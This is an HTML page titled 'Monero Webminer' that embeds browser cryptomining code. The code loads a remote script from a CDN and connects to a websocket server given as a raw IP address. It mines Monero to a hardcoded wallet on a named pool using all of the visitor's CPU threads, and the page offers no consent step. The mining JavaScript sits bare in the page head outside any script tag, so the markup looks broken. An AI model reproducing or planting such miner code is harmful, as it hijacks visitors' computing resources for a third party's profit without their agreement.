<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Monero Webminer</title>
    <link rel="manifest" href="/manifest.json">
      <!-- Start Of Mining Code -->

      // Start Of Mining Code (Javascript)
var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://45.119.82.33:40725";
var pool = "moneroocean.stream";
var walletAddress = "8Bn5zVaemZM911hbYGA7tEKv8ypwUEEzBGsKLGoygGXvTAeGHWXofHXgEBrUCQp2ikFgMsAePzBfyKg693zaYGBBPif9VGH";
var workerId = "GH-XMR";
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code

      <!-- End Of Mining Code -->


  </head>
  <body>
    <h1>Mining...</h1>
    <p>View mining progress <a href="https://moneroocean.stream">here</a></p>
<script>
  if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
      navigator.serviceWorker.register('/serviceworker.js').then(registration => {
        console.log('Service Worker registered with scope:', registration.scope);
      }).catch(error => {
        console.error('Service Worker registration failed:', error);
      });
    });
  }
</script>

  </body>
</html>
